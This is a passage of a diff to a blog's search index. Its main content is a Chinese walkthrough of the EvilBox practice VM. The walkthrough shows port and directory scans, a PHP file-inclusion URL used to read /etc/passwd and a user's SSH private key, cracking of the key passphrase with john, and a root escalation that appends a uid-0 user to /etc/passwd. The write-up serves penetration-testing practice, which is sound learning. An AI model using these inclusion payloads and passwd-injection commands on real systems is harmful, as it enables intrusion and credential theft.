+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>nmap -sV -A -p- -T4 192.168.91.193 –oN nmap.txt</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304124317.png"><br><br>如图所示开放了 22，80两个端口。</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304124738.png"><br><br>挨个儿查看一波。</p>
+<p><a href="http://192.168.91.193/robots.txt">http://192.168.91.193/robots.txt</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304125114.png"><br><br>robots.txt 页面得到了一个 name : H4x0r</p>
+<p><a href="http://192.168.91.193/secret/evil.php">http://192.168.91.193/secret/evil.php</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304125224.png"><br><br>如图所示: evil.php 是看不见任何内容的。</p>
+<h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -c -r -u &#x27;http://192.168.91.193/secret/evil.php?FUZZ=/etc/passwd&#x27; -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304125748.png"><br><br>如图所示：FUZZ = command , 文件包含漏洞，我们在浏览器访问一下：</p>
+<p><a href="http://192.168.91.193/secret/evil.php?command=/etc/passwd">http://192.168.91.193/secret/evil.php?command=/etc/passwd</a></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304130016.png"><br><br>如图所示：除了 root 之外还有一个用户名: <strong>mowree</strong> 具有 /bin/bash .<br><br>既然是文件包含漏洞，无异于 include ,requere函数，尝试一下伪协议读取文件内容。</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议:"></a><strong>伪协议</strong>:</h2><p><a href="http://192.168.91.193/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php">http://192.168.91.193/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</a></p>
+<p>得到base64:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</span><br></pre></td></tr></table></figure>
+
+<p>解码为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename = $_GET[&#x27;command&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>现在很明确知道了 就是一个 include()函数。未作任何过滤。现在我们需要尝试取读取对我们有用的文件。在前面端口扫描处我们知道开放了 22: ssh 服务，因此我们尝试读取一下 mowree 用户的是否存在私钥泄露。。<br><br>一般用户的 .ssh 目录下会存在三个文件:</p>
+<ol>
+<li>id_rsa : 私钥。</li>
+<li>authorized_keys : 认证关键字文件。</li>
+<li>id_rsa.pub : 公钥。</li>
+</ol>
+<p><a href="http://192.168.91.193/secret/evil.php?command=/home/mowree/.ssh/id_rsa">http://192.168.91.193/secret/evil.php?command=/home/mowree/.ssh/id_rsa</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304131333.png"></p>
+<p><a href="http://192.168.91.193/secret/evil.php?command=/home/mowree/.ssh/authorized_keys">http://192.168.91.193/secret/evil.php?command=/home/mowree/.ssh/authorized_keys</a><br><br>认证关键字有用户信息: 用户名@主机名<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304131506.png"></p>
+<p>将私钥保存到kali当中。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304131958.png"></p>
+<h2 id="私钥破解"><a href="#私钥破解" class="headerlink" title="私钥破解"></a>私钥破解</h2><p>现在我们拿到了 私钥: id_rsa 可以用于ssh登陆，但是还差密码，所以破解密码，需要一个脚本： shh2john</p>
+<p><a href="https://github.com/aniello001/ssh2john">https://github.com/aniello001/ssh2john</a></p>
+<p><strong>python3 ssh2john.py /root/myfiles/bj/linux/evilbox/id_rsa &gt; hash.txt</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304132857.png"><br><br>如图所示：生成了 hash文件。<br><br>现在使用john 破解<br><strong>john –wordlist=/usr/share/wordlists/rockyou.txt hash.txt</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304133133.png"><br><br>如图所示: 得到了密码: <strong>unicorn</strong> 独角兽。</p>
+<p>登陆<br><strong>ssh -i id_rsa <a href="mailto:&#109;&#x6f;&#x77;&#114;&#101;&#x65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#57;&#49;&#x2e;&#49;&#x39;&#x33;">&#109;&#x6f;&#x77;&#114;&#101;&#x65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#57;&#49;&#x2e;&#49;&#x39;&#x33;</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304133750.png"><br><br>如图所示：登陆成功。</p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304133912.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>现在想办法提权。<br><br>首先查找是否有 SUID 提权。同时发现 sudo -l 无法使用<br><strong>find / -perm -u=s -type f 2&gt;/dev/null</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304134124.png"><br><br>如图所示：发现没有可用的SUID文件。因此此方法行不通。<br><br>发现 history 查看历史记录，没有用。内核提权也不行。</p>
+<p>在靶机上运行 ./lse.sh 进行枚举一下。自行将其下载到靶机中，然后运行。<br><strong>./lse.sh -l 1 -i | more</strong><br><br>其中发现：<strong>can we write to critical files?（我们能写关键文件吗？） 为 绿色的 yes</strong>.<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304135144.png"><br><br>如图所示：可以看到能写的文件为 /etc/passwd ， 这个文件能写，那么我们可以通过 openssl 修改 root 的密码。或者添加一个具有 root 权限的用户。</p>
+<p>在这里我们添加一个等同于root的用户 toor,密码也为 toor。<br><br>参考我以前的笔记:</p>
+<p><a href="https://www.ohhhhhh.top/2021/12/17/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94AI-WEB1and2/">https://www.ohhhhhh.top/2021/12/17/web渗透——AI-WEB1and2/</a></p>
+<p>输入命令:<br><strong>openssl passwd -1 -salt toor</strong><br><br>解释: -1 : md5加密； -salt：加盐，若和密码一样，则等同于用户名。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304141237.png"><br><br>如图所示：生成了加密的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$1$toor$2SrtV0M1RHrAj9uQL5C7w/</span><br></pre></td></tr></table></figure>
+
+<p>然后将 toor和这串加密密码添加到 /etc/passwd 末尾，格式与root用户的格式类似。</p>
+<p><strong>echo ‘toor:1toor$2SrtV0M1RHrAj9uQL5C7w/:0:0::/root:/bin/bash’ &gt;&gt; /etc/passwd</strong></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304141615.png"><br><br>如图所示：成功添加到/etc/passwd 末尾。</p>
+<p>现在尝试切换到用户 toor</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304141757.png"><br><br>如图所示：su toor ，密码 toor后给成功切换到了 root ，用户名由 toor 变为了 root。</p>
+<p>至此提权完毕。</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220304142020.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>ffuf 工具进行模糊测试。</li>
+<li>私钥破解密码。</li>
+<li>openssl 提权。</li>
+<li>lse.sh 枚举大法好。</li>
+<li>之前做过一遍。</li>
+<li>对于这个靶机需要掌握 ffuf 工具的使用，还需要掌握 id_rsa 私钥的破解方法，以及 openssl 生成并修改密码，以及枚举工具 enumeration(lse.sh) 的使用，这个工具可以枚举出系统中的敏感文件，对于提权有很大的方便。</li>
 </ol>
 ]]></content>
       <categories>
@@ -1037,24 +1103,6 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——SidkOs1.1</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
-    <content><![CDATA[<h2 id="web渗透——SidkOs1-1"><a href="#web渗透——SidkOs1-1" class="headerlink" title="web渗透——SidkOs1.1"></a>web渗透——SidkOs1.1</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>
-
-
-	<div class="row">
-    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——My Tomcat HOST:1</title>
     <url>/2021/12/29/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1/</url>
     <content><![CDATA[<h2 id="web渗透——My-Tomcat-HOST-1"><a href="#web渗透——My-Tomcat-HOST-1" class="headerlink" title="web渗透——My Tomcat HOST:1"></a>web渗透——My Tomcat HOST:1</h2><p>pdf</p>
@@ -1082,6 +1130,24 @@
 
 	<div class="row">
     <embed src="Readme.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>web渗透——SidkOs1.1</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
+    <content><![CDATA[<h2 id="web渗透——SidkOs1-1"><a href="#web渗透——SidkOs1-1" class="headerlink" title="web渗透——SidkOs1.1"></a>web渗透——SidkOs1.1</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>
+
+
+	<div class="row">
+    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -1144,15 +1210,14 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——dhanush</title>
-    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dhanush/</url>
-    <content><![CDATA[<h2 id="web渗透——dhanush"><a href="#web渗透——dhanush" class="headerlink" title="web渗透——dhanush"></a>web渗透——dhanush</h2><p>靶机:</p>
+    <title>web渗透——evilscience</title>
+    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94evilscience/</url>
+    <content><![CDATA[<h2 id="web渗透——evilscience"><a href="#web渗透——evilscience" class="headerlink" title="web渗透——evilscience"></a>web渗透——evilscience</h2><p>靶机：</p>
 
 
 	<div class="row">
-    <embed src="dhanush.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="evilscience.pdf" width="100%" height="550" type="application/pdf">
 	</div>
-
 
 
 
@@ -1162,14 +1227,15 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——evilscience</title>
-    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94evilscience/</url>
-    <content><![CDATA[<h2 id="web渗透——evilscience"><a href="#web渗透——evilscience" class="headerlink" title="web渗透——evilscience"></a>web渗透——evilscience</h2><p>靶机：</p>
+    <title>web渗透——dhanush</title>
+    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dhanush/</url>
+    <content><![CDATA[<h2 id="web渗透——dhanush"><a href="#web渗透——dhanush" class="headerlink" title="web渗透——dhanush"></a>web渗透——dhanush</h2><p>靶机:</p>
 
 
 	<div class="row">
-    <embed src="evilscience.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="dhanush.pdf" width="100%" height="550" type="application/pdf">
 	</div>
+
 
 
 
